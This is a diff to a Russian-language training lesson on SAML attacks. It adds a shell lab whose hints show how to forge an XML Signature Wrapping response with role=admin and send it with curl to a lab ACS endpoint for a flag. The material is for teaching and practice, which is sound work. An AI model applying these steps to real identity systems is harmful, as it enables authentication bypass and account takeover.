@@ -13,6 +13,18 @@ useful_for:
   - "Пентест корпоративных приложений"
 estimated_minutes: 48
 summary: "Продвинутые SAML-атаки: XML Signature Wrapping, инъекция комментариев, обход подписи и replay assertion."
+lab:
+  kind: shell
+  title: 'Практика: SAML XML Signature Wrapping'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, saml_b64.txt, evil_saml.xml]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Декодируй исходный SAML-ответ: `cat saml_b64.txt | base64 -d` — увидишь `role=user`.'
+    - 'В `evil_saml.xml` уже собран XSW-ответ: внешний assertion с `role=admin` оборачивает подписанный (внутренний).'
+    - 'Закодируй его и отправь на ACS: `base64 -w0 evil_saml.xml > evil.b64`.'
+    - '`curl -s -X POST ''https://shop.local/saml/acs'' --data-binary @evil.b64 | tail -1 > found.txt`, затем `check`.'
 ---
 
 В корпоративной среде вход в приложения часто устроен через **SAML**: сотрудник логинится у провайдера (IdP), а тот шлёт приложению подписанный XML с «утверждением» (assertion) — кто пользователь и какие у него права. Приложение доверяет подписи. Значит, если мы научимся подделывать assertion **при валидной подписи** — войдём под кем угодно.
